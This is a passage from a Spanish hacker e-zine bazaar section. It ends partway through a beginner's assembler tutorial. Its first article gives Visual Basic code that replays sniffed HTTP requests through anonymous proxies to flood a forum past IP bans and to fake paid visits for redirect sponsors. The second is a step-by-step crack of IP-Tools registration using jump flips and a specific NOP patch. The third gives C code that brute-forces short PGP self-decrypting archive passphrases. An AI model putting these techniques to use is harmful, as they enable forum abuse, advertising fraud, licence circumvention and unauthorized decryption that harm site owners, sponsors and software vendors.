-[ 0x03 ]--------------------------------------------------------------------
-[ Bazar de SET ]------------------------------------------------------------
-[ by Others ]-------------------------------------------------------SET-31--

Indice

3x01  Emulando Headers                          Varios       eugenioclrl

3x02  Cracking IPTools                          Cracking     blackngel

3x03  PGP SDA                                   Cracking     ilegalfaqs

3x04  Asembler para tontos                      Info         Club Fenix

3x05  Cracking Power VCR                        Cracking     The Ghost

3x06  Re-backdoors                              Hacking      FCA00000


-[ 3x01 ]--------------------------------------------------------------------
-[ Emulando Headers ]--------------------------------------------------------
-[ by eugenioclrl ]----------------------------------------------------------

			Emulando headers...
			By Eugenio!
			eugenioclrc@hotmail.com


Sobre este articulo;
--------------------
Este articulo trata sobre la emulacion de headers, esto era muy comun en otras 
epocas... recuerdo los grupo Soangels, hackgirls, Cheatruz y hackadventaje.
Basicamente surgieron para estafar a los sponsors que pagaban por navegar,
recivir hits, recivir mails, etc, etc. Solian tener simples scripts en visual
que realizaban de forma automatica visitas y clicks. Tambien salio el programa
Clicking automat, conocido tambien como CACA, ese si no me equivoco fue el 
momento cumbre jejejeje, despues todos se dieron cuenta que la mayoria de las 
empresas o no pagan, o pagan muy poco y no se justifica semejante esfuerzo.


Manos a la obra
---------------


Ejemplo Nro 1: Emulando una variable de tipo post...

Digamos que quisieramos flodear un foro, pero el mismo no nos deja hacer mas
de dos posteos, luego nos banea la ip. Que deberiamos hacer?
Primero deberiamos saber que es lo que queremos generar... para ello nos 
bajamos el programa Proxy sniffer server, busquenlo en el tio google, o usen 
algun sniffer, para usar este programa debemos configurar el explorador para 
que use como proxy nuestra propia pc, esto se hace llendo a opciones de 
internet, conexiones, propiedades, ahi picamos en usar servidor proxy y 
escribimos localhost, en el puerto 7999.
Una vez instalado el programa y configurado el explorer vamos al foro, en el
escribimos la solicitud y la enviamos. Luego vamos al proxy sniffer, y vemos
que ha pasado, tocamos en la pestañita de Proxy sniffer console y aparecera 
algo como;

POST /foro HTTP/1.0 (www.ejemplo.com:80)
  >>> ID=elforo&do=escribir&nombre=jose%20luis&mensaje=esta%20web%20APESTA

Bueno ya tenemos lo que queremos, ahora debemos de hacer un pekeño programita 
que se conecte a distintos proxys (anonimos por supuesto), y envie la peticion 
que queremos, en este caso un post.
No voy a escribir todo el programa, pero voy a hacer algo mas o menos 
decente...

******************************************************
Winsock1.connect "servidor", puerto

******************************************************
Private Sub Winsock1_Connect


mensaje = 
"ID=elforo&do=escribir&nombre=jose%20luis&mensaje=esta%20web%20APESTA"

Requestheader = "POST http://www.ejemplo.com/foro HTTP/1.0" & Chr(13) & 
Chr(10) & _
"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, 
application/x-shock
wave-flash, application/vnd.ms-powerpoint, application/vnd.ms-excel, 
application/m
sword, */*" & Chr(13) & Chr(10) & _
"Referer: none" & Chr(13) & Chr(10) & _
"Accept-Language: en/us" & Chr(13) & Chr(10) & _
"Connection: Keep-Alive" & Chr(13) & Chr(10) & _
"Content-Type: application/x-www-form-urlencoded" & Chr(13) & Chr(10) & _
"Proxy-Connection: Keep-Alive" & Chr(13) & Chr(10) & _
"User-Agent: Mozilla!" & Chr(13) & Chr(10) & _
"Host: " & Winsock1.remotehost & Chr(13) & Chr(10) & _
"Content-Length: " & Len(mensaje) & Chr(13) & Chr(10) & _
"Pragma: no-cache" & Chr(13) & Chr(10) & _
Chr(13) & Chr(10) & _
mensaje

winsock1.senddata requestheader

end
******************************************************

ATENCION, no corten y peguen, esto no funciona asi como si, por favor lean
atentamente todo, este codigo no funciona si lo cortan y pegan, esta escrito
solo para ilustrar un poco como funciona todo. Les recomendaria siempre usar
varias variables aleatorias, como por ej el usear agent, el lenguage y el
referer.



Ejemplo Nro2: Timo a una web

Digamos que Scam es una empresa de redireccionamiento que nos da 1 dolar por 
cada 1000 visitantes que vayan a http://www.scam.com/mipagina
Nuevamente usamos el proxy sniffer, configuramos todos, y visitamos
http://www.scam.com/mipagina.
Si lo examinamos y ignoramos los gifs y demas basuras vemos que visita dos 
lugares importantes...
nro 1) http://www.scam.com/mipagina
y nro 2) http://www.scam.com/stat.asp?54,4324464
esta conclucion la sacamos luego de ver la solapita de request/response, en la 
pag nro uno nos da la link al stat.asp?numeroalazarde10digitos y tb nos da la 
cookie que este precisa...
que deberiamos hacer?
ok, la forma de proceder seria la siguiente...


nos conectamos con el winsock1
enviamos la peticion
recivimos la data de winsock1, si en ella esta la cadena "Set Cookie", 
guardamos
la cookie que precisamos usando el comando mid, si en la data se encuentra 
la cadena "stat.asp?" copiamos el link al cual nos dirije, desconectamos el 
winsock1,
nos conectamos con el winsock2 y enviamos una peticion al stat.asp?nroalazar 
con la cookie

seria algo asi
********************************

function header1

header1 = "GET http://www.scam.com/mipagina HTTP/1.0" & Chr(13) & Chr(10) & 
_
"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, 
application/x-shock
wave-flash, application/vnd.ms-powerpoint, application/vnd.ms-excel, 
applicatio
n/msword, */*" & Chr(13) & Chr(10) & _
"Referer: none" & Chr(13) & Chr(10) & _
"Accept-Language: en/us" & Chr(13) & Chr(10) & _
"Connection: Keep-Alive" & Chr(13) & Chr(10) & _
"Content-Type: application/x-www-form-urlencoded" & Chr(13) & Chr(10) & _
"Proxy-Connection: Keep-Alive" & Chr(13) & Chr(10) & _
"User-Agent: Mozilla!" & Chr(13) & Chr(10) & _
"Host: " & Winsock1.remotehost & Chr(13) & Chr(10) & _
"Pragma: no-cache" & Chr(13) & Chr(10)

end function

Private Sub Winsock1_Connect()
Winsock1.sendata header1
end sub


Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)

Winsock1.GetData ladata
If InStr(1, ladata, "'stats.asp?") > 0 Then
cookie = Mid(ladata, InStr(1, ladata, "ASPSESS"), 45)
lalink = Mid(ladata, InStr(1, ladata, "stats.asp?"), 19)


end sub

******************************

bueno, con eso conseguimos la link a stats.asp?, luego solo hay que hacer la
coneccion a esa link y utilizar la cookie.
No esperen que haga todo yo... Esto es tan simple como ver el proxy sniffer 
o sniffer que estemos usando, examinar los headers y emularlos!


Herramientas que usamos
-----------------------

Proxyrama: para la deteccion de los proxys anonimos que usamos
Proxy sniffer: para interceptar los paquetes que luego emulamos
Un cerebro: esto es lo mas jodido de conseguir, estube buscando y no se 
puede bajar de ningun lado
Inspiracion: mmm, con un poco de marihuana, eso si cuando programen no usen
muchas variables, o se van a olvidar todo!



Resumen
-------

Las variantes son infinitas, tambien esta la posibilidad de conectarnos a un
servidor pop3 y recivir esos clasicos mails en los cuales te dan una link 
para clickear y te pagan por que la visites.
Creo que esto es facil de entender, si a alguien le quedo alguna o muchas 
dudas le recomendaria que averigue mas de los protocolos http, y visite
www.planetsourcecode.com ahi va a encontrar grandes y buenos ejemplos.
Realmente la unica forma de impedir este tipo de ataques segun veo es 
baneando las ip de los proxys.



Despedida
---------

Espero que les haya gustado mi articulo, se que le falta bastante, y podria 
ser mas jugoso y con mas explicaciones del tipo tecnica, pero la verdad no tengo
tiempo, tengo que estudiar algebra :( , de todas formas el objetivo del articulo
era sembrar la duda, y darles algunos puntos de los cuales partir, para que 
ustedes terminen de averiguar todo.
Saludos a todos, y gracias a SET...

Eugenio!
eugenioclrc@hotmail.com




-[ 3x02 ]--------------------------------------------------------------------
-[ Cracking IPTools ]--------------------------------------------------------
-[ by blackngel ]------------------------------------------------------------



        @                                                              @
       @@@             blackngel_hack@hotmail.com                     @@@
        IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
        IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
        III @@@@  @     @@@@@ @@@@@ @   @ @@    @ @@@@@  @@@@@ @     III
        III @   @ @     @   @ @     @  @  @ @   @ @      @     @     III
        III @@@@@ @     @@@@@ @     @@@   @  @  @ @  @@@ @@@@  @     III
        III @   @ @     @   @ @     @  @  @   @ @ @   @  @     @     III
        III @@@@  @@@@@ @   @ @@@@@ @   @ @    @@ @@@@@  @@@@@ @@@@@ III
        IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
        IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
       @@@                                                            @@@
        @                                                              @
                           %%%%%%%%%%%%%%%%%%%%%%%%%
                           %%%===================%%%
                           %%% CRACKING IP-TOOLS %%%
                           %%%===================%%%
                           %%%%%%%%%%%%%%%%%%%%%%%%%
                      "Bienvenidos al mundo de lo real..."



$$$$$$$$$$$
 00 INDICE
$$$$$$$$$$$



                    ·································
                    ··· 00 ··· INDICE             ···
                    ·································
                    ··· 01 ··· PROLOGO            ···
                    ·································
                    ··· 02 ··· INTRODUCCION       ···
                    ·································
                    ··· 03 ··· PRIMEROS PASOS     ···
                    ·································
                    ··· 04 ··· EVITANDO MOLESTIAS ···
                    ·································
                    ··· 05 ··· ULTIMOS PASOS      ···
                    ·································
                    ... 06 ··· CONSEJOS           ···
                    ·································
                    ··· 07 ··· DESPEDIDA          ···
                    ·································


Isaac Asimov: "En primer lugar acabemos con Sócrates, porque ya
               estoy harto de este invento de que no saber nada
               es un signo de sabiduría." 



$$$$$$$$$$$$
 01 PROLOGO
$$$$$$$$$$$$



Mis queridos amigos, he hecho un recuento de la cantidad de articulos
sobre "cracking" escritos en SET y desde luego, destacan entre la
minoria.

Este articulo lo escribo con el unico fin de variar de tematica sobre
todo entre los ultimos numeros de este fantastico e-zine y con el
objetivo de que al igual que yo, en proximos numeros se siga escribiendo
articulos sobre estas tecnicas.

Que me fascina de la ingenieria inversa? Pues que los resultados son
realmente gratos. El minimo esfuerza provoca grandes beneficios, es decir,
que con pocos conocimientos ya se obtienen recompensas.
Creo recordar que en un articulo que lei de Ricardo Narvaja, dijo que
siendo el un novato en el tema (eso dice el xD) se considera capaz de
crackear el 80% de los programas existentes en internet.

Esto da una vision de la poca seguridad del software actual, pero bueno,
de este tema ya se ha hablado demasiado.

Como comprobareis a lo largo (o corto) del articulo, no he puesto tiradas
de codigo ensamblador ya que al igual que yo cuando no tenia ni idea de
esto, se que provocan un poco de respeto y miedo al mas novato.
Con ello quiero conseguir que veais que el cracking no es tan dificil y
que no tiene nada de misterioso, solo requiere estudio, esfuerzo y como
madfran me dijo en su dia "perseverancia".



$$$$$$$$$$$$$$$$$
 02 INTRODUCCION
$$$$$$$$$$$$$$$$$



Que es IP-Tools? Pues es una herramienta que nos permite obtener mucha
y variada informacion de un ordenador remoto e incluso del nuestro.
Es un kit que contiene: 

 - NB escaner (NetBios)
 - Name escaner
 - Port escaner
 - Lista de las conexiones actuales
 - Ping escaner
 - Trace (Traceroute)
 - Whois
 - Finger
 - NS Lookup
 - Get Time
 - Telnet
 - IP Monitor
 - Host Monitor

y todo ello en una misma interfaz muy simple de utilizar y ciertamente
amigable.

Todo muy bonito si no fuera porque nada mas iniciar el programa (el cual
podemos encontrar en http://www.ks-soft.net/ip-tools.eng/index.htm) nos
sale una ventanita con una tirada de texto que nos indica que el programa
no es de uso "libre" y que su uso se limita a una cantidad de tiempo de
"21" dias.

En la misma ventana nos encontramos con un boton con el nombre de
"Register Now" que nos permitira introducir un nombre y un numero de serie
para registrar el programa.

Como no conocemos tales datos pues aqui el porque de este articulo.


HERRAMIENTAS
------------

W32dasm -> Nuestro querido desensamblador.
Hedit   -> Un pobre editor hexadecimal que me acompaña alla a donde voy.

Para el cracker experimentado:

SoftIce u Olly -> Los mejores debuggers de la red.

Yo no los he utilizado porque, repito, SOY UN NOVATO.

DECEPCIONES
-----------

Soy un completo novato en el arte del crackeo y por ello este articulo
conlleva alguna que otra decepcion.
Entre ellas la principal y que me dejara quedar en peor estado del que
ya estaba es la de que no he conseguido crackear el programa completamente.

Como? Lo que oyes, cuando escribo cualquier nombre y cualquier numero
consigo que el programa lo acepte y me aparezca como registrado. Tambien
he conseguido superar una limitacion pero, cuando reinicio el programa
otra vez, los datos de registro no son guardados y debo introducirlos
de nuevo aunque los vuelva a aceptar.

Porque escribes esto entonces? Porque me parece una pena desperdiciar las
pocas neuronas que tengo y quiza otra persona, acabe el trabajo por mi
que no quiere decir "para mi".

Bueno, en realidad los datos que yo introduzco si que son guardados en el
registro de windows, se cifran con algun algoritmo y se almacenan alli.
Esto lo compruebo porque, aunque cifrados, conservan el mismo numero de
caracteres, las claves tienen el nombre de: UserName y UserSNum.

Hay otras claves interesantes como:

- CountOfRuns2  -> Numero de veces que se ejecuto el programa.
- FirstRunTime2 -> Primera vez que el programa fue ejecutado. 
- LastRunTime   -> Ultima vez que el programa fue ejecutado.

Supongo (que listo que soy) que con estas dos ultimas claves se calcula
el numero de dias que llevan transcurridos para comparar con "21".



$$$$$$$$$$$$$$$$$$$
 03 PRIMEROS PASOS
$$$$$$$$$$$$$$$$$$$

La metodologia? La misma de siempre.

Empiezo abriendo IP-Tools, en los cuadros de la ventana de registro
introduzco unos datos cualesquiera y memorizo en mi mente (que para
algo la tengo) la frase que dice: "Sorry, your registration number
or name is invalid".

Ahora cierro el programa, le hago una copia en su direcctorio y abro
esta con el w32dasm. Lleva su tiempo el desemsamblar dicho programa
pero una vez hecho me voy a la zona de "Strings reference", alli busco
la citada cadena y hago doble click sobre ella para ir a la zona de
codigo que la referencia. Vuelvo a hacer doble click sobre la misma
cadena para comprobar que no hay otra zona del source en que aparece.

Bien, una vez en el codigo, miramos encima de la cadena las direcciones
desde donde es referenciada por algun salto condicional o incondicional.
Nos dice que las mismas son: 

004ACD3D
004ACD57
004ACD92
004ACDBA
004ACDD5

Observamos que todas ellas estan muy juntitas, pues nada mas que iremos
a la primera de ellas con el boton "Go to code location", introducimos
alli a donde deseamos ir y aparecemos en esa zona de codigo.
A partir de ahi nos moveremos con los cursores del teclado ya que las
llamadas se encuentran cerca.

Miramos que instruccion hay en cada una de las direcciones anteriores
y vemos que los dos primero saltos condicionales son "je" y los tres
siguientes "jne".

Lo primero que se os vendra a la cabeza al igual que a mi, sera cambiar
los cinco saltos por su contrario, es decir, los "je" por "jne" y
viceversa.

Pues eso, sin pensarlo dos veces cojo mi editor hexadecimal y en las
direcciones correspondientes (mirar en la barra de estado de w32dasm
el @Offset) sustituimos los "84" por "85" y al reves.
Guardo la copia que acabo de editar cierro el Hedit y ejecuto la
misma.

Sorpresa, un mensaje muy poco amigable nos dice: "Program was corrupted!"
pues que bien, ha detectado que hemos modificado e l programa y no
nos permite ejecutarlo.

En la siguiente seccion le daremos lo que se merece y nos saldremos con
la nuestra de una forma facilita.



$$$$$$$$$$$$$$$$$$$$$$$
 04 EVITANDO MOLESTIAS
$$$$$$$$$$$$$$$$$$$$$$$



Con que si, el programa se ponde duro, pues vamos a suavizar las cosas.

Lo mismo que antes, buscamos la cadena mencionada entre las strings y
doble click. Vemos que son tres simples funciones que se encargan de
mandarnos el maldito mensajito y de cerrarnos el programa.

Como hacer que no haga nada? Pues "nopeando" (os suena 0x90?).

Supongo que la llamada "call 00444CA0" es la que nos muestra el
mensaje y "jmp 004D9C6B" el que nos echa fuera, pero por el
esfuerzo que me pedia yo nopee las tres instrucciones y asi,
aunque pudieramos ejecutar el programa me evitaba el dichoso
mensaje.

De nuevo abro mi querido Hedit y en las direcciones de las tres
funciones cambio todos los valores hexadecimales por "90".

Para dummies:
Cambio la cadena consecutiva "B8FC9C4D00E8A9B3F6FFE96F030000"
por ->                       "909090909090909090909090909090"

Salvo (guardo) el ejecutable, salgo del Hedit y pruebo a ejecutarlo
otra vez. Por fin, ya puedo entrar.

Para ver si los cambios echos en la tercera seccion tuvieron sus
frutos, entro en la ventana de registro e introduzco unos datos
aleatorios. Desilusion, el dichoso mensajito de "Sorry..." sigue
dandonos la lata.

Pasamos a la ultima seccion de trabajo y a la carga.



$$$$$$$$$$$$$$$$$$
 05 ULTIMOS PASOS
$$$$$$$$$$$$$$$$$$



En el w32dasm nos movemos a la zona de codigo donde antes teniamos
aquellos 5 saltos condicionales, si bajamos con el cursor un poquito
mas hacia abajo vemos que la primera cadena que encontramos dice:
"Thank you for registering IP-Tools".

Con ello deduzco que si no se hubieran realizado ninguno de los saltos
anteriores el codigo nos llevaria inevitablemente hasta esta zona,
pues nada, como no quiero hacer distinas alternancias entre "je's" y
"jne's" hasta que acierte (si es que se pudiera conseguir) me dedico
a la facil tarea de nopear las cinco instrucciones.

No repetire el proceso porque ya lo he dicho anteriormente y, lo bueno,
si corto, dos veces bueno.

Pruebo por ultima vez a registrar mi version de IP-Tools y por arte de
magia, al introducir cualquier dato en los dos cajetines de texto me
salta el mensajito de agradecimiento por registrar su producto y nos
manda reiniciar el programa para que los cambios surjan efecto.

Nos muestra en la ventana los datos que hemos introducido como si fueran
de un registro valido.

Pues nada, que reiniciamos el dichoso programa y el trabajo que hemos
realizado no nos ha servido para nada. Siempre nos permitira registrarnos
pero los cambios nunca permanecen a la siguiente ejecucion.



$$$$$$$$$$$$$$
 06 CONSEJOS
$$$$$$$$$$$$$$



Solo por dar un poco mas la vara os dire aqui un par de cosillas.

Un poco mas abajo del codigo donde aparece el mensaje de agradecimiento
encontramos un codigo que referencia a las cadenas "UserName" y
"UserSNum". Supongo que son para almacenar los datos recien introducidos
en el registro, ademas los dos llaman a una misma funcion:

"call 004353AC"

Lo que me llama un poquito la atencion son tres cadenas que se encuentran
justo debajo de este codigo y que pueden tener algo que ver o bien con la
clave o con el algoritmo de cifrado de los datos (o ninguno), los expongo
por mera curiosidad:

"\XS5o$flt2w/a"
"DFACTXA-5"
"DZAVTOA-6"

Podeis investigar esto y si averiguais algo me gustaria que me avisaseis
por medio de mi correo.

En "Strings reference" vamos hasta donde estan las cadenas "User..." y
hacemos dos veces doble click sobre ellas para darnos cuenta de que
hay otra zona en el codigo donde son utilizadas, en esa zona son
utilizadas por dos veces.
Podria ser quizas para abrir la clave y despues leer o escribir en ella.
Este es otro buen punto de investigacion.

No intenteis nopear nada ahi ni cambiar los saltos condicionales poque
yo ya lo he probado, no funciona y, de esta forma, os ahorro el esfuerzo. 


Podeis ir tambien al boton de "Import Functions" y comprobar que se
usan llamadas como: RegOpenKey..., RegQueryValue..., RegSetValue..., etc.
Por tanto, no me equivoco mucho.

Como ultima recomendacion para los que sepais mas de esto os recomiendo
utilizar un debugger en vez de un desensamblador, poner breackpoints en
las funciones que os interesen. No mencionare cuales corresponden a los
cuadros de texto porque todos las conocemos.

Para los mas locos, que estudien el algoritmo si es que existe y la clave
no es fija, y que hagan un keygen para la gente mas vaga.



$$$$$$$$$$$$$$
 07 DESPEDIDA
$$$$$$$$$$$$$$



Como habeis podido comprobar este articulo ha sido cortito pero,
tampoco es que pretendiera lo contrario.

Reitero de nuevo que me gustaria que hubiera un poco mas de
aplicacion y esfuerzo sobre este tema. Apuesto que en la comunidad
hispana hay gente muy buena y los invito a salir a la luz para,
precisamente, iluminar a los demas con su conocimiento.

Por primera vez os invito a que me insulteis y me digais de todo
en mi direccion de correo puesto que he demostrado ser un inepto en
este mundo desconocido en el que me he metido.
Con deciros que lo unico que he crackeado en mi vida a parte de un
par de "crackmes" ha sido el winzip (cosa de crios xD). Pero bueno,
para que mentir, espero que con tiempo y esfuerzo cambie mi
situacion y pueda traeros algo mas serio.

Con esto, me despido de nuevo, que ya estareis aburridos de mi.
Un abrazo gente.


Isaac Asimov: "Parte de la inhumanidad de las computadoras es que,
               una vez que están programadas competentemente y
               trabajando correctamente, son completamente honestas."





                                                         by blackngel


-[ 3x03 ]--------------------------------------------------------------------
-[ PGP SDA ]-----------------------------------------------------------------
-[ by ilegalfaqs ]-----------------------------------------------------------

Minicracking PGPSDA para Windows
--------------------------------
Os presento un metodo asequible de fuerza bruta para sacar la passphrase de
1-2 bytes de un PGPSDA para Windows.

No trata de algoritmos de desencriptacion ni de parches en las instrucciones
ensamblador, es mucho mas simple. No es una novedad, pero tampoco encontre
algo similar (tampoco he buscado).
Puede aplicarse a otras aplicaciones que exijan una contrase~a de la misma
forma. O puede aplicarse a otros fines, a otras automatizaciones (es lo que
pretendo aportar con este escrito, lo que pasa es que si hago referencia a
'crackear' y a 'PGP' se hace mucho mas atractivo para leer. Por que sera??


Recuerden: hasta 2 a~os de prision para los que fabriquen, tenga, pongan en
circulacion o importen medios especificamente destinados a facilitar la
supresion no autorizada o la neutralizacion de cualquier dispositivo tecnico
que se haya utilizado para proteger programas de ordenador.
En este caso, yo me autorizo a mi mismo a neutralizar la proteccion de mis
programas, y nadie me autoriza a neutralizar las de programas de los demas.
Tampoco infrinjo la espesa licencia de PGP.
Igualmente, este metodo es bastante inofensivo porque no puede con passwords
de mas de 2 bytes.


Que es un PGPSDA
----------------
Con 'PGPSDA' me referire, para abreviar, a un SDA (version 8.0.2) de la PGP
Corporation para el sistema Windows.

Un PGPSDA o Self Decrypting Archive es un archivo ejecutable que ha sido
encriptado con la ayuda de una contrase¤a y que puede ser desencriptado
ejecutandolo e introduciendo la contrase¤a correcta.

Los PGPSDA son de utilidad para poder enviar datos encriptados alla donde no
se tiene instalado el programa desencriptador (PGP en este caso). Un SDA puede
ser un unico archivo, o contener multiples archivos y/o directorios.

No obstante, los PGPSDA solo se pueden abrir bajo el mismo sistema operativo
bajo el que fueron creados. Es decir, no podras abrir un SDA en un Mac si fue
creado con la version para Windows, y viceversa.


Miniataque por fuerza bruta
---------------------------
La idea es ir probando todas las combinaciones de caracteres hasta encontrar
la password.

Hay que tener en cuenta que la casilla admite passphrases de hasta 255
caracteres, y que el programa soporta la codificacion Unicode (en teoria, mas
de 1 millon de caracteres diferentes). Esto supone una eternidad probando las
diferentes combinaciones.
Podriamos limitarlo mucho mas, pongamos un tope de 15 bytes de password y los
80 caracteres ASCII mas comunes. De esta forma nos bastarian unos millones de
a~os para descifrarlo...

Vamos a ponerlo asequible, pondremos la password de 1-2 bytes de longitud,
asumiremos el ASCII de 128 caracteres, y ya iremos complicando mas adelante.

Ahora solo nos queda poner cada vez el caracter y pulsar al boton 'Aceptar'.
Y asi 128 veces, una para cada caracter.

Ya dije, el metodo es muy simple.

Para automatizarlo necesitaremos un programa en c que simule la introduccion
de la password y de la pulsacion del boton. Cerrad todas las aplicaciones
posibles antes de ejecutarlo. Seria algo como lo siguiente, que aunque grosero
y falto de optimizaciones, funciona (ejecutar desde MSDOS, pues requiere como
parametro el handle del boton de 'Aceptar'):


#include <windows.h>
HANDLE Riched;  //Handle de la ventana de clase RichEdit20W
int iBot=0;     //Valor del boton 'Aceptar'
char cBot[256]; //Valor del boton 'Aceptar'

int main(int argc, char **argv) {
if (argc<2) {
printf("Uso: %s -H \r\n", argv[0]);
printf("  -H  Handle del boton de Aceptar del PGPSDA.\r\n");
//Para saber el valor de H utilizad aplicaciones como Eureka o PasswordSpy
return(0);
}
wsprintf(cBot,"%s",&argv[1][1]);   //Handle da 'Aceptar'
HWND hDesktop = GetDesktopWindow();//Recupera handle del Desktop
if(EnumChildWindows(hDesktop,&EnumChildProc0,0)==0)return(0);//Valida Aceptar
if(iBot==0) return(0);
if(EnumChildWindows(hDesktop,&EnumChildProc1,0)==0)return(0);//Recup. Riched
if(EnumChildWindows(hDesktop,&EnumChildProc2,0)==0)return(0);//Probar passw
return(0);
}

BOOL CALLBACK EnumChildProc0(HWND hWnd,LPARAM lParam) {
char chWnd[256]; wsprintf(chWnd,"%d",(int)hWnd); //handle detectado
if(strcmp(chWnd,cBot)==0) { //es el mismo que el del boton 'Aceptar'
iBot=(int)hWnd; //Nos quedamos con el (int)Handle de 'Aceptar'
if(IsWindow(hWnd)==0) iBot=0; //Por si acaso
}
return TRUE;//continuar con el siguiente handle
}

BOOL CALLBACK EnumChildProc1(HWND hWnd, LPARAM lParam) {
static TCHAR szClass[512]; GetClassName(hWnd, szClass, 512);
//Coger handle de la celda de passphrase, que es de la clase 'RichEdit20W'.
//Para averiguarlo he utilizado aplicaciones como Eureka o PasswordSpy.
if(lstrcmp(szClass,"RichEdit20W")==0) Riched=hWnd;
return TRUE;//continuar con el siguiente handle
}

BOOL CALLBACK EnumChildProc2(HWND hWnd, LPARAM lParam) {
if((int)hWnd==iBot) { //estamos en el boton 'Aceptar'
for(int c=0;c<129;c++) { //probar los 129 caracteres (o 255, o mas)
SendMessage(Riched,WM_CHAR,(WPARAM)c,(LPARAM)0); //ESCRIBE PASSWORD
SendMessage(hWnd,BM_CLICK,(WPARAM)0,(LPARAM)0);  //PULSA 'ACEPTAR'
//Cuando acertemos, desaparecera el SDA y se creara el desencriptado
if(IsWindow(hWnd)==0) c=4000; //salir cuando desaparezca el boton
}
}
return TRUE;//continuar con el siguiente handle
}



Si quisieramos introducir passwords de varios bytes se trataria de enviar
varios WM_CHAR antes de pulsar el boton. Por ejemplo, para '123':

SendMessage(Riched,WM_CHAR,(WPARAM)49,(LPARAM)0); //1
SendMessage(Riched,WM_CHAR,(WPARAM)50,(LPARAM)0); //2
SendMessage(Riched,WM_CHAR,(WPARAM)51,(LPARAM)0); //3
SendMessage(hWnd,BM_CLICK,(WPARAM)0,(LPARAM)0);   //y pulsar 'Aceptar'


Con esta sencilla funcion podriamos poner una password Unicode a nuestro
PGPSDA que por teclado nos seria imposible de introducir. Por ejemplo, una
password mitad Braille mitad Cherokee, y a ver quien tiene huevos de romperla:
SendMessage(Riched,WM_CHAR,(WPARAM)0x2840,(LPARAM)0);
SendMessage(Riched,WM_CHAR,(WPARAM)0x2841,(LPARAM)0);
SendMessage(Riched,WM_CHAR,(WPARAM)0x13B4,(LPARAM)0);
SendMessage(Riched,WM_CHAR,(WPARAM)0x13B5,(LPARAM)0);


Limitacion: recursos GDI
------------------------
Desgraciadamente podeis encontraros con una limitacion gravisima: el brutal
descenso de los recursos GDI, almenos bajo Windows98 (que es donde puedo
probar).

Aunque lo hagas manualmente, cada caracter de password que introduzcas te hara
bajar los recursos GDI y de sistema un 0.1-0.2%. Parece poco, pero basta con
rellenar 4 veces una passphrase de 255 caracteres para tirar el sistema!!!.
Resulta impresionante y lamentable, compruebalo con el monitor de recursos
'rsrcmtr.exe' que trae Windows98.

Se trata de un aspecto intrinseco al dise~o de Windows98, un pseudo-bug
en la gestion de este tipo de memoria heredado de versiones 9x anteriores.

Conociendo la reputacion de los productos PGP, no me sorprenderia que hubieran
introducido deliberadamente este comportamiento para evitar ataques por fuerza
bruta como el presente, ya que cuando se cierra el PGPSDA toda la memoria se
libera y los recursos vuelven a su valor original sin problemas.


Se podria pensar en pasar la combinacion de caracteres por otros metodos,
saltandose la edicion de la RichEdit20W, capando montones de funciones que
no hace falta que se ejecuten y asi ahorrar tiempo y recursos. Pero eso
es otra historia.


Sean buenos, y recuerden que... simplemente recuerden, evitaran los problemas.




-[ 3x04 ]--------------------------------------------------------------------
-[ Assembler para tontos ]----------------------------------------------------
-[ by Club Fenix ]-----------------------------------------------------------


---------------------------------ASEMMBLER Y EL MISMO DOLOR DE CABEZA-------
----------------------------------------------------------------------------

A QUIEN VA DIRIGIDO




Mucha gente ha querido aprender Asembler, pero cuando lo han intentado, se
han topado con miles de instruciones que no entienden y que muchos manuales no 
han sabido explicar, Club Fenix quiere que esta seccion sea la que logre 
Iniciarte en el Mundo de la Programacion.

Hay solo 2 cosas que necesitas aparte de tu cerebro..


Mucha Paciencia y Mucha Paciencia

No quieras ir de frente a crear un virus y programas complejos antes tienes
que saber algunas instrucciones, cual es el sistema que utiliza la maquina y 
entenderlo.

Asi que empezemos ten encuenta que este es solo un capitulo habran mas, y
poco a poco veras como te vuelves un genio en la programacion o te mueres en 
el intento ( y Club Fenix espera que no te mueras en el intento, porque sino 
nuestra reputacion como maestros se caeria...y asi no es pues )

< aqui es donde te matas de risas y dices este pata es gracioso, o almeno
finge pe>

Si quieres ser un buen  programador debes  saber como funcionan todas las
instruciones

Habra momentos en las cuales quedras realizar una instruccion especifica,
pero si no sabes que existe o como funciona esta instrucion no lo usareis.

De igual manera, si ustedes se encuentran en una situacion donde piensan que
una cierta instruccion podria ser util entonces nos imaginamos sobre todo por
su bien que regresaran a refrescar su memoria en este Tutor y seran capaces de 
poner las instrucciones que necesiten inmediatamente.

Pero si ustedes son principiantes ( y estan mas perdidos, que el editor que
escribe esto) estamos seguro que sino aprenden  de esta forma deberian  
dedicarse a la costura.


AHORA PERO QUE ES ENSAMBLADOR

SABEN USTEDES CUAL ES LA DIFERENCIA ENTRE UN COMPILADOR Y EL ENSAMBLADOR

Un compilador es un programa que toma el codigo fuente que usted ha escrito
y lo convierte a instrucciones en lenguaje maquina que son utilizados por la 
computadora.

Una instruccion en lenguaje maquina es un numero binario que le dice a la
computadora que haga una cosa especifica.

Ahora si han sido bueno alumnos, se estaran preguntando y que es ensamblador?

<Bueno eso lo iremos descubriendo a lo largo del Capitulo >

Ahora Hay una cosa importante que tambien necesitan saber

Las diferentes formas de archivo que existen:

1) un ejecutable (.EXE) el archivo contiene cierta informacion para el
   sistema operativo cuando el programa empieza. Esto permite al programa ser 
   tan grande como se quiera.

2) un archivo (.COM) no contiene la informacion para OS . Cuando el sistema
   operativo empieza un archivo .COM simplemente lo pone en la memoria . Los
   archivos con una extension .COM se limitan a una longitud de 64k bytes.

3) los archivos binarios son archivos que deben cargarse en un .COM o .EXE y
   se programan antes de correrse. Estos bichitos no pueden hacer algo por 
   ellos mismos. son un poco arcaicos.

   es decir sirven como muletas para aqu=E9llos compiladores que no apoyan
   archivos .OBJ

4) un objeto (.OBJ) este otro archivo es una seccion de un programa. contiene 
   codigo y variables, pero tambien contiene la informacion que puede usarse 
   para combinarlo con otros archivos del objeto en un programa mas grande.
   Un Linkeador puede convertir uno o mas objetos en un archivo ejecutable.

NOTA : Un linker es utilizado para unir varios archivos y crear uno ejecutable.


